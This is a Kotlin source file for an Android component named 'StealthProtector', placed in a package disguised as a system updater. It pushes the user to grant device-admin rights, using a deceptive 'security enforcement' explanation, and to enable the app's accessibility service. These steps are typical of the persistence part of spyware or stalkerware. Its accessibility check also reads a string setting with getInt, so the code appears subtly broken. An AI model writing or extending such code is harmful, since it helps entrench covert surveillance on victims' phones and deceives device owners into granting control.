package com.android.seclogupd.protect

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.util.Log
import com.android.seclogupd.receiver.AdminReceiver

object StealthProtector {

    fun init(context: Context) {
        enableDeviceAdmin(context)
        requestAccessibilityIfNeeded(context)
    }

    private fun enableDeviceAdmin(context: Context) {
        val component = ComponentName(context, AdminReceiver::class.java)
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager

        if (!dpm.isAdminActive(component)) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, component)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "This app requires admin access for security enforcement.")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
        } else {
            Log.d("StealthProtector", "Device Admin already active.")
        }
    }

    private fun requestAccessibilityIfNeeded(context: Context) {
        try {
            val isEnabled = Settings.Secure.getInt(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ).toString().contains(context.packageName)

            if (!isEnabled) {
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
            } else {
                Log.d("StealthProtector", "Accessibility already enabled.")
            }
        } catch (e: Exception) {
            Log.e("StealthProtector", "Failed to check/request accessibility", e)
        }
    }
}
